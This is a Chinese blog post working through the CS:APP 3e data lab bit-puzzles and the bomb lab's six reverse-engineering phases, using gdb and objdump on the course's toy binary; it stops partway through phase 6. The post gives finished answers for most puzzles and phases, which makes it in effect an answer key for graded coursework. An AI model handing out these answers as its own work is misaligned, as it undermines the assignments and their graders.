
网上有数个版本的lab，每版题目都不尽相同。这里以CS:APP 3e官网的lab为准，做一份属于自己的踩坑记录。

## data-lab

考察范围：CS:APP 第2章

题目规则：根据题目要求，使用指定数量和种类的运算符、控制结构实现一系列C函数。

虽然号称是最简单的lab，但仍然硬控我12h。

`conditional`题目要求只用位运算符、逻辑非实现三目运算符。基本思路是将`x`转化为全0或全1，然后与`y,z`进行逻辑与。

```cpp
int conditional(int x, int y, int z) {
  return (y & ((!!x << 31) >> 31)) | (z & ((!x << 31) >> 31));
}
```

`logicalNeg`题目要求只用位运算符实现逻辑否（`!`）。

一个明显的观察是，只有0满足取负前后均是非负数。利用这一点，判断`x`及其取负（`~x+1`）是否为负数：

```cpp
int logicalNeg(int x) {
  return ~(((~x + 1) >> 31) | (x >> 31)) & 1;
}
```

`howManyBits`这个题目太难了，放弃了。题目要求是指出`x`最少需要多少个二进制位才能表示，考虑负数情形。

[博客](https://blog.csdn.net/qq1677852098/article/details/135903168)给出的思路是：通过`x^(x<<1)`的操作获取最高有效位。随后通过条件位移，统计最高有效位具体在哪个位置，该位的位置即为表示`x`所需的最小位数。

```cpp
int howManyBits(int x) {
  // i gave up on this puzzle. the following code is from a blog:
  // https://blog.csdn.net/qq1677852098/article/details/135903168

  // the most significant and redundant bits are unnecessary:
  // 11111000 ^ 1111000? = 0000100?
  // the operation above purges those bits and keeps the least significant one
  // which indicates the most significant and necessary bit.
  int temp = x ^ (x << 1);
  int bit_16, bit_8, bit_4, bit_2, bit_1;
  bit_16 = !!(temp >> 16) << 4;
  temp = temp >> bit_16;
  bit_8 = !!(temp >> 8) << 3;
  temp = temp >> bit_8;
  bit_4 = !!(temp >> 4) << 2;
  temp = temp >> bit_4;
  bit_2 = !!(temp >> 2) << 1;
  temp = temp >> bit_2;
  bit_1 = !!(temp >> 1);
  return 1 + bit_1 + bit_2 + bit_4 + bit_8 + bit_16;
}
```

`floatScale2`题目要求将传入的单精度二进制表示`uf`乘以2，并返回结果的二进制表示。

基本思路是：
- 如果是NaN或无穷，则按原值返回。
- 如果指数非0，则指数加1。
- 如果指数为0，则尾数部分左移一位。

```cpp
unsigned floatScale2(unsigned uf) {
  // 3 failed attempts...
  unsigned mask = 255u << 23;
  unsigned umask = (1u << 23) - 1;
  unsigned exponent = (uf & mask) >> 23;
  unsigned mantissa = (uf & umask);

  // first failed attempt: confuse +0 with -0.
  if ((uf >> 31) << 31 == uf) return uf;

  // for NaN and infinity, return uf as it is.
  if (exponent == 255u) return uf;

  // second failed attempt: if exponent is 0, then
  if (!exponent) mantissa <<= 1;
  // for other figures, add exponent by 1.
  else
    exponent++;

  // third failed attempt: forgot the sign bit.
  return mantissa + (exponent << 23) + (uf & (1u << 31));
}
```

`floatFloat2Int`题目要求实现浮点数转换为整数的算法。

基本思路是：如果指数过大或过小，直接返回溢出值或0；否则根据指数部分的值，对尾数部分进行位移。

```cpp
int floatFloat2Int(unsigned uf) {
  // failed attempt: mistake (0 + uf) >> 31 as sgn, but it actually is 0 or -1.
  int sgn = (0 + uf) >> 31 ? -1 : 1, ether = 1 << 31;
  unsigned mask_e = 255u << 23;
  unsigned mask_m = (1u << 23) - 1;
  unsigned exponent = (uf & mask_e) >> 23;
  unsigned mantissa = (uf & mask_m) + mask_m + 1;
  // 158-127=31. all floating points above 2^31 is capped to 2^31.
  if (exponent >= 158u) return ether;
  if (exponent <= 126u) return 0;

  // shift mantissa.
  if (exponent >= 150u) return (mantissa << (exponent - 150)) * sgn;
  return (mantissa >> (150 - exponent)) * sgn;
}
```

完结撒花。。。

![[Pasted image 20240715192119.png]]

## bomb-lab

考察范围：CS:APP 第3章

题目规则：
- 有一个已编译好的二进制炸弹`bomb`，以及它的主程序文件`bomb.c`，但是主程序文件只提供了它的大致流程，未提供程序的具体实现。
- 通过阅读`bomb.c`文件得知炸弹分6个关卡，每个关卡都要求用户输入一行正确的内容，任何一关输入的内容错误都将导致炸弹爆炸，使得解题失败。
- 需要通过分析二进制炸弹文件，得知程序的大致逻辑，并通过输入正确的内容实施“拆弹”。

又是一场长达十数个小时的折磨。好在通过这场折磨我大致知道了gdb咋用（

`bomb.c`：

```c
#include <stdio.h>
#include <stdlib.h>
// 这两个文件并未提供，可能是提供了phase_*和其他辅助函数的实现。
#include "phases.h"
#include "support.h"

FILE *infile;

int main(int argc, char *argv[]) {
  char *input;
  // 缺省为标准输入，如指定文件名则为文件输入。
  if (argc == 1) {
    infile = stdin;
  }
  else if (argc == 2) {
    if (!(infile = fopen(argv[1], "r"))) {
      printf("%s: Error: Couldn't open %s\n", argv[0], argv[1]);
      exit(8);
    }
  }
  else {
    printf("Usage: %s [<input_file>]\n", argv[0]);
    exit(8);
  }

  initialize_bomb();
  printf("Welcome to my fiendish little bomb. You have 6 phases with\n");
  printf("which to blow yourself up. Have a nice day!\n");

  input = read_line(); /* Get input                   */
  phase_1(input);      /* Run the phase               */
  phase_defused();     /* Drat!  They figured it out!
                        * Let me know how they did it. */
  printf("Phase 1 defused. How about the next one?\n");

  /* The second phase is harder.  No one will ever figure out
   * how to defuse this... */
  input = read_line();
  phase_2(input);
  phase_defused();
  printf("That's number 2.  Keep going!\n");

  /* I guess this is too easy so far.  Some more complex code will
   * confuse people. */
  input = read_line();
  phase_3(input);
  phase_defused();
  printf("Halfway there!\n");

  /* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */
  input = read_line();
  phase_4(input);
  phase_defused();
  printf("So you got that one.  Try this one.\n");

  /* Round and 'round in memory we go, where we stop, the bomb blows! */
  input = read_line();
  phase_5(input);
  phase_defused();
  printf("Good work!  On to the next...\n");

  /* This phase will never be used, since no one will get past the
   * earlier ones.  But just in case, make this one extra hard. */
  input = read_line();
  phase_6(input);
  phase_defused();

  /* Wow, they got it!  But isn't something... missing?  Perhaps
   * something they overlooked?  Mua ha ha ha ha! */

  return 0;
}
```

分析得知：
- 总共6个阶段，每个阶段要求输入一行字符串，字符串将传递给对应的处理函数`phase_*`。
- 通过试运行得知，在任何一阶段输入错误都会导致炸弹“爆炸”，并使程序中途退出。这有可能是通过`exit(-1)`实现的。输入正确则会执行`phase_defused`函数。

为了进一步分析程序行为，我们只能通过反汇编的方式获取程序的汇编代码：

```sh
$ objdump -d bomb >bomb.asm
```

### phase1

`phase_1`函数的源码如下：

```assembly
0000000000400ee0 <phase_1>:
  400ee0:	48 83 ec 08          	sub    $0x8,%rsp
  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi
  400ee9:	e8 4a 04 00 00       	call   401338 <strings_not_equal>
  400eee:	85 c0                	test   %eax,%eax
  400ef0:	74 05                	je     400ef7 <phase_1+0x17>
  400ef2:	e8 43 05 00 00       	call   40143a <explode_bomb>
  400ef7:	48 83 c4 08          	add    $0x8,%rsp
  400efb:	c3                   	ret    
```

通过阅读得知，它的大致行为是：判断输入的一行字符串是否与地址`0x402400`处的字符串相等，如是则通过此阶段，否则炸弹被“引爆”。

由于`objdump`并不会提供程序数据段的内容，所以需要通过gdb在炸弹运行时读取内存：

```
gdb bomb
b *(phase_1)       # 在phase_1函数入口设置断点
r                  # 开始执行程序
random stuff       # 随便输入一点内容
x/s 0x402400       # 此时程序在断点处暂停，输出
```

发现地址处是一段文本：

![[Pasted image 20240720193842.png]]

这就是phase1的答案。

### phase2

`phase_2`的源码：

```assembly
0000000000400efc <phase_2>:
  400efc:	55                   	push   %rbp
  400efd:	53                   	push   %rbx
  400efe:	48 83 ec 28          	sub    $0x28,%rsp
  400f02:	48 89 e6             	mov    %rsp,%rsi
  400f05:	e8 52 05 00 00       	call   40145c <read_six_numbers>
  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)
  400f0e:	74 20                	je     400f30 <phase_2+0x34>
  400f10:	e8 25 05 00 00       	call   40143a <explode_bomb>
  400f15:	eb 19                	jmp    400f30 <phase_2+0x34>
  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax
  400f1a:	01 c0                	add    %eax,%eax
  400f1c:	39 03                	cmp    %eax,(%rbx)
  400f1e:	74 05                	je     400f25 <phase_2+0x29>
  400f20:	e8 15 05 00 00       	call   40143a <explode_bomb>
  400f25:	48 83 c3 04          	add    $0x4,%rbx
  400f29:	48 39 eb             	cmp    %rbp,%rbx
  400f2c:	75 e9                	jne    400f17 <phase_2+0x1b>
  400f2e:	eb 0c                	jmp    400f3c <phase_2+0x40>
  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx
  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp
  400f3a:	eb db                	jmp    400f17 <phase_2+0x1b>
  400f3c:	48 83 c4 28          	add    $0x28,%rsp
  400f40:	5b                   	pop    %rbx
  400f41:	5d                   	pop    %rbp
  400f42:	c3                   	ret    
```

这个函数涉及到带参函数调用，这涉及到x86-64的参数约定：
- 前6个参数：由`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`存储。
- 其余参数：依次入栈。
- 返回值：由`rax`存储。

函数调用约定则主要决定，如果出现了栈内参数，则栈内参数由谁清理：
- `cdecl`：由调用者清理。常用于Unix。
- `stdcall`：由被调用者清理。常用于Windows。

代码很长，需要画一个控制流图才能具体知晓发生了什么：

下图有两处笔误：
- `M[rbx-4]=M[rbx]`为笔误，实为`2*M[rbx-4]=M[rbx]`
- `rbp<=rbx`为笔误，实为`rbx<=rbp`

![[bomblab_phase2.png]]

第一步开辟了长度为`0x28=40`的栈帧空间，并将输入字符串和地址`%rsp`作为`read_six_numbers`函数的参数，执行函数调用。该函数的作用是：从输入字符串读取最多6个整数，并存储到以地址`%rsp`为起始地址的内存空间。

根据读取整数的结果判断，要求读取的第一个数必须是1，否则炸弹引爆。

再后是一个类似`while`循环的结构，下面是伪代码：

```cpp
rbx = rsp + 4, rbp = rsp + 24;
do {
	if (M[rbx - 4] * 2 != M[rbx])
		explode_bomb();
	rbx += 4;
} while (rbx <= rbp);
```

不难看出，从`M[rsp]`开始，每个数都必须是上一个数的两倍，总共6个数。因此答案是：

```
1 2 4 8 16 32
```

### phase3

`phase_3`的源码：

```assembly
0000000000400f43 <phase_3>:
  400f43:	48 83 ec 18          	sub    $0x18,%rsp
  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi
  400f56:	b8 00 00 00 00       	mov    $0x0,%eax
  400f5b:	e8 90 fc ff ff       	call   400bf0 <__isoc99_sscanf@plt>
  400f60:	83 f8 01             	cmp    $0x1,%eax
  400f63:	7f 05                	jg     400f6a <phase_3+0x27>
  400f65:	e8 d0 04 00 00       	call   40143a <explode_bomb>
  
  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)
  400f6f:	77 3c                	ja     400fad <phase_3+0x6a>
  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax
  400f75:	ff 24 c5 70 24 40 00 	jmp    *0x402470(,%rax,8)
  
  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax
  400f81:	eb 3b                	jmp    400fbe <phase_3+0x7b>
  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax
  400f88:	eb 34                	jmp    400fbe <phase_3+0x7b>
  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax
  400f8f:	eb 2d                	jmp    400fbe <phase_3+0x7b>
  400f91:	b8 85 01 00 00       	mov    $0x185,%eax
  400f96:	eb 26                	jmp    400fbe <phase_3+0x7b>
  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax
  400f9d:	eb 1f                	jmp    400fbe <phase_3+0x7b>
  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax
  400fa4:	eb 18                	jmp    400fbe <phase_3+0x7b>
  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax
  400fab:	eb 11                	jmp    400fbe <phase_3+0x7b>
  400fad:	e8 88 04 00 00       	call   40143a <explode_bomb>
  
  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax
  400fb7:	eb 05                	jmp    400fbe <phase_3+0x7b>
  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax
  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
  400fc2:	74 05                	je     400fc9 <phase_3+0x86>
  400fc4:	e8 71 04 00 00       	call   40143a <explode_bomb>
  
  400fc9:	48 83 c4 18          	add    $0x18,%rsp
  400fcd:	c3                   	ret 
```

乍一看很长，但中间似乎有大量的`mov-jmp`组合，猜测可能是某种重复指令序列。

首先是开辟栈帧，随后是调用一个`sscanf`从输入字符串读取一些内容。从指令分析函数参数：
- `rdi`：存储输入字符串地址，由`phase_3`调用者提供。
- `rsi`：存储格式串地址。
- `rdx`、`rcx`：存储两个栈内地址。

执行`x/s`命令查看`0x4025cf`处的格式串：

![[Pasted image 20240721130749.png]]

可见是读入了两个4字节整数，分别存储在`0x8(%rsp)`和`0xc(%rsp)`中。如果至少一个整数读取不成功，炸弹引爆。记两个读入的整数分别为`N1`和`N2`。

随后是一个判断，如果`N1`超过7则直接引爆炸弹，否则跳转到地址`0x402470+N1*8`所指内存地址处的指令。

不难看出`N1`的合法值为`0~7`，所以需要查看`0x402470`后开始的8\*8=64个字节：

![[Pasted image 20240721132730.png]]

可以看出每8个字节存储了一个有效的指令地址，每个指令地址的目标指令都是`mov ...,%eax`的格式，除了`N1=1`的情形外，其余情形会跟随一条无条件跳转到`0x400fbe`的指令。但无论哪个情形，都会给`%eax`赋予一个特殊值并执行到`0x400fbe`处的指令。

随后会比较`N2`和`%eax`的值，如果相等则通过这一phase，否则炸弹引爆。由于只要求`N2`等于`N1`对应的常量，所以本phase有8个合法解：

```
0 207
1 311
2 707
3 256
4 389
5 206
6 682
7 327
```

经过验证，全部能够通过。

### phase4

`phase_4`的本体相对`phase_3`而言更简单，它的难点在于会调用一个递归函数`func4`：

```assembly
000000000040100c <phase_4>:
  40100c:	48 83 ec 18          	sub    $0x18,%rsp
  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi
  40101f:	b8 00 00 00 00       	mov    $0x0,%eax
  401024:	e8 c7 fb ff ff       	call   400bf0 <__isoc99_sscanf@plt>
  401029:	83 f8 02             	cmp    $0x2,%eax
  40102c:	75 07                	jne    401035 <phase_4+0x29>
  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)
  401033:	76 05                	jbe    40103a <phase_4+0x2e>
  401035:	e8 00 04 00 00       	call   40143a <explode_bomb>
  
  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx
  40103f:	be 00 00 00 00       	mov    $0x0,%esi
  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi
  401048:	e8 81 ff ff ff       	call   400fce <func4>
  40104d:	85 c0                	test   %eax,%eax
  40104f:	75 07                	jne    401058 <phase_4+0x4c>
  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)
  401056:	74 05                	je     40105d <phase_4+0x51>
  401058:	e8 dd 03 00 00       	call   40143a <explode_bomb>
  
  40105d:	48 83 c4 18          	add    $0x18,%rsp
  401061:	c3                   	ret    
```

还是先看代码，前面的总体思路与`phase_3`一致，也是读取两个整数。读取后，本phase要求`N1`不超过14发，否则炸弹爆炸。

第二部分，调用`func4(N1,0,14)`，并要求其返回结果必须是0，同样要求`N2`也必须是0，否则炸弹也会爆炸。所以最核心的问题在于`func4`的源码：

```assembly
0000000000400fce <func4>:
  400fce:	48 83 ec 08          	sub    $0x8,%rsp
  400fd2:	89 d0                	mov    %edx,%eax
  400fd4:	29 f0                	sub    %esi,%eax
  400fd6:	89 c1                	mov    %eax,%ecx
  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx
  400fdb:	01 c8                	add    %ecx,%eax
  400fdd:	d1 f8                	sar    %eax
  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx
  400fe2:	39 f9                	cmp    %edi,%ecx
  400fe4:	7e 0c                	jle    400ff2 <func4+0x24>
  
  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx
  400fe9:	e8 e0 ff ff ff       	call   400fce <func4>
  400fee:	01 c0                	add    %eax,%eax
  400ff0:	eb 15                	jmp    401007 <func4+0x39>
  
  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax
  400ff7:	39 f9                	cmp    %edi,%ecx
  400ff9:	7d 0c                	jge    401007 <func4+0x39>
  
  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi
  400ffe:	e8 cb ff ff ff       	call   400fce <func4>
  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax
  401007:	48 83 c4 08          	add    $0x8,%rsp
  40100b:	c3                   	ret    
```

这段程序比较复杂，所以我的做法是将其内嵌入一个单文件C++源码，然后打表输出`func4(x,0,14)`的结果：

```cpp
#include <iostream>

asm("func4:"
    "sub    $0x8,%rsp;"
    "mov    %edx,%eax;"
    "sub    %esi,%eax;"
    "mov    %eax,%ecx;"
    "shr    $0x1f,%ecx;"
    "add    %ecx,%eax;"
    "sar    %eax;"
    "lea    (%rax,%rsi,1),%ecx;"
    "cmp    %edi,%ecx;"
    "jle    func4_B;"
    "lea    -0x1(%rcx),%edx;"
    "call   func4;"
    "add    %eax,%eax;"
    "jmp    func4_ret;"
    "func4_B:"
    "mov    $0x0,%eax;"
    "cmp    %edi,%ecx;"
    "jge    func4_ret;"
    "lea    0x1(%rcx),%esi;"
    "call   func4;"
    "lea    0x1(%rax,%rax,1),%eax;"
    "func4_ret:"
    "add    $0x8,%rsp;"
    "ret    ");

int main() {
  int x, y = 0, z = 14, result;
  for (x = 0; x <= 14; ++x) {
    __asm__ __volatile__(
        "movl %1, %%edi\n"        // 将x的值移动到寄存器eax
        "movl %2, %%esi\n"        // 将y的值移动到寄存器ebx
        "movl %3, %%edx\n"        // 将z的值移动到寄存器ecx
        "call func4\n"            // 调用func4
        "movl %%eax, %0\n"        // 将func4的返回值移动到result变量
        : "=r"(result)            // 输出操作数
        : "r"(x), "r"(y), "r"(z)  // 输入操作数
        : "%edi", "%esi", "%edx", "memory");
    std::cout << "func4(" << x << ",0,14)=" << result << std::endl;
  }
  return 0;
}
```

程序输出：

```
func4(0,0,14)=0
func4(1,0,14)=0
func4(2,0,14)=4
func4(3,0,14)=0
func4(4,0,14)=2
func4(5,0,14)=2
func4(6,0,14)=6
func4(7,0,14)=0
func4(8,0,14)=1
func4(9,0,14)=1
func4(10,0,14)=5
func4(11,0,14)=1
func4(12,0,14)=3
func4(13,0,14)=3
func4(14,0,14)=7
```

可见，满足`func4(x,0,14)==0`的所有`x`为0、1、3、7。因此它们都是`N1`的合法值。另外，前面讨论过`N2=0`，所以下面4个都是本phase的答案：

```
0 0
1 0
3 0
7 0
```

关于`func4`具体对应什么源码逻辑，我的个人能力有限，尚未能进一步深究。根据[在线反编译器]()，它对应如下源码：

```cpp
int func4(unsigned long long a0, unsigned long long a1, unsigned long long a2)
{
    unsigned long long v1;  // rax
    unsigned long long v3;  // rcx
    unsigned int v4;  // eax

    v1 = a2 - a1;
    v3 = (v1 + (v1 >> 31) >> 1) + a1;
    if ((unsigned int)v3 > (unsigned int)a0)
    {
        v4 = func4(a0, a1, v3 - 1) * 2;
        return v4;
    }
    else if ((unsigned int)v3 >= (unsigned int)a0)
    {
        return 0;
    }
    else
    {
        v4 = func4(a0, v3 + 1, a2) * 2 + 1;
        return v4;
    }
}
```

### phase5

`phase_5`看起来更长，但感觉并没有`phase_4`难：

```assembly
0000000000401062 <phase_5>:
  401062:	53                   	push   %rbx
  401063:	48 83 ec 20          	sub    $0x20,%rsp
  401067:	48 89 fb             	mov    %rdi,%rbx
  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401071:	00 00 
  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
  401078:	31 c0                	xor    %eax,%eax
  40107a:	e8 9c 02 00 00       	call   40131b <string_length>
  40107f:	83 f8 06             	cmp    $0x6,%eax
  401082:	74 4e                	je     4010d2 <phase_5+0x70>
  401084:	e8 b1 03 00 00       	call   40143a <explode_bomb>
  401089:	eb 47                	jmp    4010d2 <phase_5+0x70>
  
  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx
  40108f:	88 0c 24             	mov    %cl,(%rsp)
  401092:	48 8b 14 24          	mov    (%rsp),%rdx
  401096:	83 e2 0f             	and    $0xf,%edx
  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx
  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)
  4010a4:	48 83 c0 01          	add    $0x1,%rax
  4010a8:	48 83 f8 06          	cmp    $0x6,%rax
  4010ac:	75 dd                	jne    40108b <phase_5+0x29>
  
  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)
  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi
  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi
  4010bd:	e8 76 02 00 00       	call   401338 <strings_not_equal>
  4010c2:	85 c0                	test   %eax,%eax
  4010c4:	74 13                	je     4010d9 <phase_5+0x77>
  4010c6:	e8 6f 03 00 00       	call   40143a <explode_bomb>
  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4010d0:	eb 07                	jmp    4010d9 <phase_5+0x77>
  
  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax
  4010d7:	eb b2                	jmp    40108b <phase_5+0x29>
  
  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  4010e5:	00 00 
  4010e7:	74 05                	je     4010ee <phase_5+0x8c>
  4010e9:	e8 42 fa ff ff       	call   400b30 <__stack_chk_fail@plt>
  
  4010ee:	48 83 c4 20          	add    $0x20,%rsp
  4010f2:	5b                   	pop    %rbx
  4010f3:	c3                   	ret    
```

首先是调用`string_length`函数，推测它的功能是判断输入字符串的长度。从源码不难看出它要求输入长度为6。

其后是一个循环结构：
- 起始：设置`eax`为0。
- 第一步：将字节`M[rbx+rax]`扩展到`ecx`。根据前文，`rbx`此时为`rdi`，也就是输入字符串。也就是说，`ecx`此时是`str[rax]`的零扩展。
- 第二步：将`cl`间接移动到`edx`，取最低4位。
- 第三步：将字节`M[0x4024b0+rdx]`零扩展到`edx`，并将`dl`存储到`M[rsp+rax+16]`。
- 第四步：给`eax`加1，判断是否达到了6，如果没达到则重复这四步，如果达到了则继续执行。
- 末尾：`M[rsp+22]`设置为0，这样`M[rsp+16]`是一个长度为6的字符串的开头。将这个字符串与`0x40245e`处的字符串比较，要求完全相等。

查看`0x4024b0`和`0x40245e`处的内容：

![[Pasted image 20240721222220.png]]

仔细分析，发现它等价于如下的伪代码：

```cpp
void map_char(char* str) {
	static char cmap[] = "maduiersnfotvbyl";
	for (int i = 0; i < 6; ++i) {
		str[i] = cmap[str[i] & 0x0f];
	}
}
```

`"flyers"`对应到`cmap`的下标分别是：9、15、14、5、6、7。假如输入的是全小写字母，那么如下输入字符串是合法的：

```
ionefg
```

当然合法答案不止上面一种，所有长度为6，能产生`"flyers"`结果的输入都正确。如果仅统计可显示的ASCII字符输入，则总共有$6^6=46656$种合法答案。

### phase6

`phase_6`的源码：

```assembly
00000000004010f4 <phase_6>:
  4010f4:	41 56                	push   %r14
  4010f6:	41 55                	push   %r13
  4010f8:	41 54                	push   %r12
  4010fa:	55                   	push   %rbp
  4010fb:	53                   	push   %rbx
  4010fc:	48 83 ec 50          	sub    $0x50,%rsp
  401100:	49 89 e5             	mov    %rsp,%r13
  401103:	48 89 e6             	mov    %rsp,%rsi
  401106:	e8 51 03 00 00       	call   40145c <read_six_numbers>
  40110b:	49 89 e6             	mov    %rsp,%r14
  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d
  401114:	4c 89 ed             	mov    %r13,%rbp
  401117:	41 8b 45 00          	mov    0x0(%r13),%eax
  40111b:	83 e8 01             	sub    $0x1,%eax
  40111e:	83 f8 05             	cmp    $0x5,%eax
  401121:	76 05                	jbe    401128 <phase_6+0x34>
  401123:	e8 12 03 00 00       	call   40143a <explode_bomb>
  401128:	41 83 c4 01          	add    $0x1,%r12d
  40112c:	41 83 fc 06          	cmp    $0x6,%r12d
  401130:	74 21                	je     401153 <phase_6+0x5f>
  401132:	44 89 e3             	mov    %r12d,%ebx
  401135:	48 63 c3             	movslq %ebx,%rax
  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax
  40113b:	39 45 00             	cmp    %eax,0x0(%rbp)
  40113e:	75 05                	jne    401145 <phase_6+0x51>
  401140:	e8 f5 02 00 00       	call   40143a <explode_bomb>
  401145:	83 c3 01             	add    $0x1,%ebx
  401148:	83 fb 05             	cmp    $0x5,%ebx
  40114b:	7e e8                	jle    401135 <phase_6+0x41>
  40114d:	49 83 c5 04          	add    $0x4,%r13
  401151:	eb c1                	jmp    401114 <phase_6+0x20>
  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi
  401158:	4c 89 f0             	mov    %r14,%rax
  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx
  401160:	89 ca                	mov    %ecx,%edx
  401162:	2b 10                	sub    (%rax),%edx
  401164:	89 10                	mov    %edx,(%rax)
  401166:	48 83 c0 04          	add    $0x4,%rax
  40116a:	48 39 f0             	cmp    %rsi,%rax
  40116d:	75 f1                	jne    401160 <phase_6+0x6c>
  40116f:	be 00 00 00 00       	mov    $0x0,%esi
  401174:	eb 21                	jmp    401197 <phase_6+0xa3>
  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  40117a:	83 c0 01             	add    $0x1,%eax
  40117d:	39 c8                	cmp    %ecx,%eax
  40117f:	75 f5                	jne    401176 <phase_6+0x82>
  401181:	eb 05                	jmp    401188 <phase_6+0x94>
  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx
  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)
  40118d:	48 83 c6 04          	add    $0x4,%rsi
  401191:	48 83 fe 18          	cmp    $0x18,%rsi
  401195:	74 14                	je     4011ab <phase_6+0xb7>
  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx
  40119a:	83 f9 01             	cmp    $0x1,%ecx
  40119d:	7e e4                	jle    401183 <phase_6+0x8f>
  40119f:	b8 01 00 00 00       	mov    $0x1,%eax
  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx
  4011a9:	eb cb                	jmp    401176 <phase_6+0x82>
  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
  4011ba:	48 89 d9             	mov    %rbx,%rcx
  4011bd:	48 8b 10             	mov    (%rax),%rdx
  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)
  4011c4:	48 83 c0 08          	add    $0x8,%rax
  4011c8:	48 39 f0             	cmp    %rsi,%rax
  4011cb:	74 05                	je     4011d2 <phase_6+0xde>
  4011cd:	48 89 d1             	mov    %rdx,%rcx
  4011d0:	eb eb                	jmp    4011bd <phase_6+0xc9>
  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
  4011d9:	00 
  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp
  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4011e3:	8b 00                	mov    (%rax),%eax
  4011e5:	39 03                	cmp    %eax,(%rbx)
  4011e7:	7d 05                	jge    4011ee <phase_6+0xfa>
  4011e9:	e8 4c 02 00 00       	call   40143a <explode_bomb>
  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
  4011f2:	83 ed 01             	sub    $0x1,%ebp
  4011f5:	75 e8                	jne    4011df <phase_6+0xeb>
  4011f7:	48 83 c4 50          	add    $0x50,%rsp
  4011fb:	5b                   	pop    %rbx
  4011fc:	5d                   	pop    %rbp
  4011fd:	41 5c                	pop    %r12
  4011ff:	41 5d                	pop    %r13
  401201:	41 5e                	pop    %r14
  401203:	c3                   	ret    
```

`phase_6`非常复杂。如果根据跳转语句的目标地址划分，则上述汇编代码可以划分为18个控制块，根据指令先后次序分别命名为A~R：
- A（4010f4~401114）：读取六个整数到`M[rsp+0]~M[rsp+24]`。
- B~E（401114~401153）：是一个双层循环，它要求读取的六个整数各不相同。
- F~G（401153~401176）：将读取的每个整数`x`修改位`7-x`。
- H~L（401176~4011ab）：下面详解。
- M~O（4011ab~4011df）：下面详解。
- P~Q（4011df~4011f7）：下面详解。
- R（4011f7~401204）：撤销函数栈帧，函数返回。

H~L部分：

```assembly
  40116f:	be 00 00 00 00       	mov    $0x0,%esi
  401174:	eb 21                	jmp    401197 <phase_6+0xa3>

  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  40117a:	83 c0 01             	add    $0x1,%eax
  40117d:	39 c8                	cmp    %ecx,%eax
  40117f:	75 f5                	jne    401176 <phase_6+0x82>
  401181:	eb 05                	jmp    401188 <phase_6+0x94>
  
  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx
  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)
  40118d:	48 83 c6 04          	add    $0x4,%rsi
  401191:	48 83 fe 18          	cmp    $0x18,%rsi
  401195:	74 14                	je     4011ab <phase_6+0xb7>
  
  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx
  40119a:	83 f9 01             	cmp    $0x1,%ecx
  40119d:	7e e4                	jle    401183 <phase_6+0x8f>
  
  40119f:	b8 01 00 00 00       	mov    $0x1,%eax
